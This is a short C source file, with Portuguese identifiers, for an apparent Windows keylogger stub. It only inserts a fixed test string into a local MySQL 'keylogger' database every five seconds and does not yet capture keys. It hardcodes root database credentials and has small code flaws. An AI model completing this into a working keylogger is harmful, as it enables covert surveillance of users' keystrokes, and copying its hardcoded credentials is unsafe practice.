#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <stdbool.h>
#include "mysql.h"
#define SERVIDOR "localhost"
#define USUARIO "root"
#define SENHA "abzdwe123"
#define BD "keylogger" 

struct listaChar {
	char info;
	struct listaChar *prox;
};
struct listaChar* lst;
void log(LPVOID);
void exibir(struct listaChar*);
//int iniciaLog(char* argv[]);
//DWORD WINAPI IniciaLog(LPVOID lpParameter);

void log(LPVOID lpParameter) {
	
	while (1) {
		Sleep(5000);
		MYSQL conexao;
		mysql_init(&conexao);
		int res = 0;
		if (mysql_real_connect(&conexao, SERVIDOR, USUARIO, SENHA, BD, 0, NULL, 0)) {
			printf("Conexao bem sucedida\n");
			res = mysql_query(&conexao, "insert into logs (value,date) values(\"ronaldinho\",now())");
			if (!res) {
				printf("inseriu\n");
			}
			mysql_close(&conexao);
		}
	}

	
}

void exibir(struct listaChar* ponteiro) {
	struct listaChar* aux = NULL;
	for (aux = ponteiro; aux != NULL; aux = aux->prox) {
		printf("%c", aux->info);
	}
}
/*
DWORD WINAPI IniciaLog(LPVOID lpParameter) {

}
*/



int iniciaLog(char* argv[]) {
	lst = (struct listaChar*) malloc(sizeof(struct listaChar));
	lst->info = '$';

	HANDLE thread;

	thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)log,
		(LPVOID)argv[0], 0, NULL);

	if (thread)
	{
		return WaitForSingleObject(thread, INFINITE);
	}
	return 1;
	
}
